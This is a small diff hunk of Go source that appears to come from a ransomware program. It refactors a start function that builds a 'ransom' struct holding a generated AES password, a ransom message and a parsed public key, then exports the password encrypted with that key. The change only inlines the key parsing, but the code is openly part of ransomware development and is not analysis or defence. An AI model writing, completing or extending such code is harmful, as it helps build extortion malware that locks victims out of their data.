@@ -31,12 +31,11 @@ type ransom struct {
 // decode public key, generate and export
 // encrypted AES password, together clear-text message
 func start(msg string) *ransom {
-	public_key := parse_key(KEY)
 
 	rns := &ransom{
 		password: token(),
 		message:  msg,
-		public:   *public_key,
+		public:   *parse_key(KEY),
 	}
 
 	password := MessageToPEM(rns.encrypt(rns.password))
